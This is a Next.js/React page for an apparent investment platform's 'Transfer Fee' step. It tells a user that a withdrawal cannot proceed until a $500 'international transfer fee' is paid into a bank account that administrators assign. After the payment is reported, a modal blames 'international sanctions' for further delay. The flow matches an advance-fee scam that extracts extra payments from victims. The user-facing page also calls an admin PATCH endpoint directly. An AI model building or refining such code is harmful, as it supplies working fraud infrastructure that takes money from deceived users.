'use client';

import Link from 'next/link';
import { useRouter, useSearchParams } from 'next/navigation';
import { Suspense, useEffect, useState } from 'react';
import { DashboardShell } from '@/components/dashboard-shell';
import { getUserStorageKey, getCurrentAccountId } from '@/lib/auth';
import { formatCurrency, getStoredBalance } from '@/lib/balance';
import { WITHDRAWAL_TRANSFER_FEE } from '@/lib/withdrawal';

type WithdrawalRequest = {
  id: string | number;
  amount: number;
  method: string;
  status: 'Fee pending' | 'Pending' | 'Approved' | 'Declined';
  feePaid?: boolean;
  walletAddress?: string;
};

type FeeAccount = {
  bankName: string;
  accountName: string;
  accountNumber: string;
  reference: string;
  updatedAt: number;
};

const storageKey = 'atlas-withdrawal-requests';
const feeRequestKey = 'atlas-withdrawal-fee-request';
const feeAccountKey = 'atlas-withdrawal-fee-account';
const feeSentKey = 'atlas-withdrawal-fee-sent';
const feeConfirmedKey = 'atlas-withdrawal-fee-confirmed';
const transferFee = WITHDRAWAL_TRANSFER_FEE;

function WithdrawalFeeContent() {
  const searchParams = useSearchParams();
  const router = useRouter();
  const requestId = searchParams.get('requestId');
  const [request, setRequest] = useState<WithdrawalRequest | null>(null);
  const [balance, setBalance] = useState(0);
  const [hydrated, setHydrated] = useState(false);
  const [message, setMessage] = useState('');
  const [feeAccount, setFeeAccount] = useState<FeeAccount | null>(null);
  const [accountRequested, setAccountRequested] = useState(false);
  const [showConfirmationModal, setShowConfirmationModal] = useState(false);

  useEffect(() => {
    const init = async () => {
      setBalance(getStoredBalance());
      const storedRequest = window.localStorage.getItem(getUserStorageKey(feeRequestKey));
      setAccountRequested(storedRequest === 'true');

      const userId = getCurrentAccountId();
      let serverRequestFound = false;
      if (userId && requestId) {
        try {
          const resp = await fetch(`/api/withdrawals?userId=${encodeURIComponent(userId)}`);
          if (resp.ok) {
            const payload = await resp.json();
            const withdrawals = Array.isArray(payload?.withdrawals) ? payload.withdrawals : [];
            const found = withdrawals.find((w: any) => String(w.id) === String(requestId));
            if (found) {
              setRequest(found as WithdrawalRequest);
              serverRequestFound = true;
            }
          }
        } catch {
          // ignore network errors and fall back to localStorage below
        }
      }

      if (!serverRequestFound) {
        const stored = window.localStorage.getItem(getUserStorageKey(storageKey));
        if (stored) {
          try {
            const requests = JSON.parse(stored) as WithdrawalRequest[];
            setRequest(requests.find((item) => String(item.id) === String(requestId)) ?? null);
          } catch {
            setRequest(null);
          }
        }
      }

      // fetch assigned fee account
      if (userId) {
        try {
          const resp = await fetch(`/api/withdrawal-fee-accounts?userId=${encodeURIComponent(userId)}`);
          if (resp.ok) {
            const payload = await resp.json();
            const account = payload?.account ?? null;
            if (account) {
              setFeeAccount({ bankName: account.bank_name ?? account.bankName ?? '', accountName: account.account_name ?? account.accountName ?? '', accountNumber: account.account_number ?? account.accountNumber ?? '', reference: account.reference ?? '', updatedAt: Date.now() });
            }
          }
        } catch {
          // ignore network error
        }
      }

      setHydrated(true);
    };

    init();
  }, [requestId]);

  useEffect(() => {
    const syncAccount = async () => {
      const storedRequest = window.localStorage.getItem(getUserStorageKey(feeRequestKey));
      setAccountRequested(storedRequest === 'true');
      if (window.localStorage.getItem(getUserStorageKey(feeConfirmedKey)) === String(requestId)) {
        router.push('/dashboard/withdrawal');
      }

      const userId = getCurrentAccountId();
      if (!userId) return;
      try {
        const withdrawalResponse = await fetch(`/api/withdrawals?userId=${encodeURIComponent(userId)}`);
        if (withdrawalResponse.ok) {
          const withdrawalPayload = await withdrawalResponse.json();
          const latest = (withdrawalPayload?.withdrawals ?? []).find((item: any) => String(item.id) === String(requestId));
          if (latest) setRequest(latest as WithdrawalRequest);
        }
        const resp = await fetch(`/api/withdrawal-fee-accounts?userId=${encodeURIComponent(userId)}`);
        if (!resp.ok) return;
        const payload = await resp.json();
        const account = payload?.account ?? null;
        if (account) {
          setFeeAccount({ bankName: account.bank_name ?? account.bankName ?? '', accountName: account.account_name ?? account.accountName ?? '', accountNumber: account.account_number ?? account.accountNumber ?? '', reference: account.reference ?? '', updatedAt: Date.now() });
        }
      } catch {
        // ignore
      }
    };
    const channel = new BroadcastChannel('atlas-withdrawal-fee');
    const pollTimer = window.setInterval(() => void syncAccount(), 2000);
    window.addEventListener('storage', syncAccount);
    channel.addEventListener('message', syncAccount);
    return () => {
      window.clearInterval(pollTimer);
      window.removeEventListener('storage', syncAccount);
      channel.close();
    };
  }, [requestId, router]);

  const handleGenerateAccount = async () => {
    if (!request) {
      setMessage('This withdrawal request could not be located. Return to the withdrawal page and submit again.');
      return;
    }

    const userId = getCurrentAccountId();
    if (!userId) {
      setMessage('Unable to identify your account. Please sign in again.');
      return;
    }

    try {
      const response = await fetch(`/api/admin/withdrawals/${encodeURIComponent(String(request.id))}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: 'Fee pending', note: 'Fee account requested by user' }),
      });
      if (!response.ok) {
        setMessage('Unable to request the payment account. Please try again.');
        return;
      }
    } catch {
      setMessage('Unable to request the payment account. Please try again.');
      return;
    }

    window.localStorage.setItem(getUserStorageKey(feeRequestKey), 'true');
    window.localStorage.setItem(getUserStorageKey('atlas-withdrawal-fee-meta'), JSON.stringify({ requestId: request.id, amount: transferFee, createdAt: Date.now() }));
    const channel = new BroadcastChannel('atlas-withdrawal-fee');
    channel.postMessage({ type: 'fee-account-requested' });
    channel.close();
    setAccountRequested(true);
    setMessage('Account generation request sent to administration. Payment instructions will appear here once assigned.');
  };

  const handleSentMoney = () => {
    if (!request || !feeAccount) return;

    (async () => {
      try {
        const resp = await fetch(`/api/admin/withdrawals/${encodeURIComponent(String(request.id))}`, {
          method: 'PATCH',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ status: 'Pending', note: 'Fee account requested by user; Fee payment reported by user' }),
        });
        if (resp.ok) {
          const payload = await resp.json();
          const updated = payload?.withdrawal ?? null;
          if (updated) {
            setRequest({ ...request, status: updated.status, feePaid: true });
            try { window.localStorage.setItem(getUserStorageKey(feeSentKey), String(request.id)); } catch {}
            const feeChannel = new BroadcastChannel('atlas-withdrawal-fee');
            feeChannel.postMessage({ type: 'fee-payment-sent', requestId: request.id });
            feeChannel.close();
            setMessage('Payment confirmation received. Your withdrawal is now waiting for administrative approval.');
            return;
          }
        }
      } catch {
        setMessage('Unable to confirm payment with the server. Please try again.');
        return;
      }
      setShowConfirmationModal(true);
      setRequest({ ...request, status: 'Pending', feePaid: true });
      setMessage('Payment confirmation received. Your withdrawal is now waiting for administrative approval.');
    })();
  };

  if (!hydrated) {
    return (
      <DashboardShell title="Transfer Fee" subtitle="Fee payment details.">
        <div className="mx-auto max-w-2xl rounded-3xl border border-[color:var(--border-soft)] bg-[color:var(--surface)] p-6 text-sm text-[var(--text-secondary)]">
          Loading withdrawal fee details...
        </div>
      </DashboardShell>
    );
  }

  if (!request) {
    return (
      <DashboardShell title="Transfer Fee" subtitle="Fee payment details.">
        <div className="mx-auto max-w-2xl rounded-3xl border border-rose-400/30 bg-rose-500/10 p-6 text-sm text-rose-200">
          This withdrawal request is unavailable. Please return to the withdrawal page and submit a new request.
          <Link href="/dashboard/withdrawal" className="mt-5 inline-flex rounded-2xl bg-[color:var(--primary-gold)] px-4 py-3 font-semibold text-[color:var(--bg-dark-navy)]">Return to withdrawal</Link>
        </div>
      </DashboardShell>
    );
  }

  return (
    <DashboardShell title="Transfer Fee" subtitle="Fee payment details.">
      <div className="mx-auto max-w-3xl space-y-6">
        <div className="rounded-3xl border border-[color:var(--primary-gold)]/25 bg-[rgba(4,16,33,0.94)] p-6 shadow-lg shadow-black/30">
          <p className="text-sm font-semibold uppercase tracking-[0.3em] text-[color:var(--primary-gold)]">Withdrawal processing</p>
          <h2 className="mt-3 text-2xl font-semibold text-[var(--text-white)]">International transfer fee due</h2>
          <p className="mt-3 text-sm leading-6 text-slate-300">Because this withdrawal is being processed as an international transfer, a fixed processing fee of $500.00 applies before the request can proceed to administrative review. Generate the payment account below to receive the official payment instructions.</p>
        </div>

        <div className="rounded-3xl border border-[color:var(--border-soft)] bg-[color:var(--surface)] p-6">
          <div className="grid gap-4 sm:grid-cols-3">
            <div className="rounded-2xl bg-[color:var(--surface-elevated)] p-4"><p className="text-xs uppercase tracking-[0.2em] text-slate-500">Method</p><p className="mt-2 font-semibold text-[var(--text-primary)]">{request.method}</p></div>
            <div className="rounded-2xl bg-[color:var(--surface-elevated)] p-4"><p className="text-xs uppercase tracking-[0.2em] text-slate-500">Withdrawal</p><p className="mt-2 font-semibold text-[var(--text-primary)]">{formatCurrency(request.amount)}</p></div>
            <div className="rounded-2xl bg-[color:var(--surface-elevated)] p-4"><p className="text-xs uppercase tracking-[0.2em] text-slate-500">Fee due</p><p className="mt-2 font-semibold text-[color:var(--primary-gold)]">{formatCurrency(transferFee)}</p></div>
          </div>

          <p className="mt-5 text-sm text-slate-500">Available balance: {formatCurrency(balance)}. This fee is handled separately and will not be deducted from your withdrawal balance.</p>
          {message ? <div className={`mt-5 rounded-2xl border px-4 py-3 text-sm ${message.includes('Insufficient') ? 'border-rose-400/30 bg-rose-500/10 text-rose-200' : 'border-emerald-400/30 bg-emerald-500/10 text-emerald-200'}`}>{message}</div> : null}

          {feeAccount ? (
            <div className="mt-6 rounded-3xl border border-emerald-400/30 bg-emerald-500/10 p-5 text-sm text-emerald-100">
              <p className="font-semibold">Payment account assigned</p>
              <p className="mt-3">Bank: {feeAccount.bankName}</p>
              <p className="mt-2">Account name: {feeAccount.accountName}</p>
              <p className="mt-2">Account number: {feeAccount.accountNumber}</p>
              <p className="mt-2">Reference: {feeAccount.reference}</p>
              {request.status === 'Fee pending' ? (
                <button type="button" onClick={handleSentMoney} className="mt-5 w-full rounded-2xl bg-emerald-500 px-4 py-3 font-semibold text-slate-950 transition hover:opacity-90">
                  I have sent the money
                </button>
              ) : (
                <p className="mt-5 rounded-2xl bg-slate-950/30 px-4 py-3">Withdrawal request submitted. Waiting for admin approval.</p>
              )}
            </div>
          ) : (
            <button type="button" onClick={handleGenerateAccount} disabled={accountRequested} className="mt-6 w-full rounded-2xl bg-[color:var(--primary-gold)] px-4 py-3 text-sm font-semibold text-[color:var(--bg-dark-navy)] transition hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-50">
              {accountRequested ? 'Account generation requested' : 'Generate payment account'}
            </button>
          )}
        </div>
      </div>
      {showConfirmationModal ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/80 p-4 backdrop-blur-sm">
          <div className="w-full max-w-md rounded-3xl border border-emerald-400/40 bg-[color:var(--surface)] p-7 text-center shadow-2xl">
            <div className="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-emerald-500 text-5xl font-bold text-slate-950">✓</div>
            <h2 className="mt-5 text-2xl font-semibold text-[var(--text-primary)]">Withdrawal confirmed</h2>
            <p className="mt-3 text-sm leading-6 text-[var(--text-secondary)]">Your payment has been confirmed. You will receive another alert within 4-5 hours due to international sanctions and transfer processing.</p>
            <button type="button" onClick={() => setShowConfirmationModal(false)} className="mt-6 w-full rounded-2xl bg-emerald-500 px-4 py-3 font-semibold text-slate-950">Good</button>
          </div>
        </div>
      ) : null}
    </DashboardShell>
  );
}

export default function WithdrawalFeePage() {
  return (
    <Suspense fallback={null}>
      <WithdrawalFeeContent />
    </Suspense>
  );
}
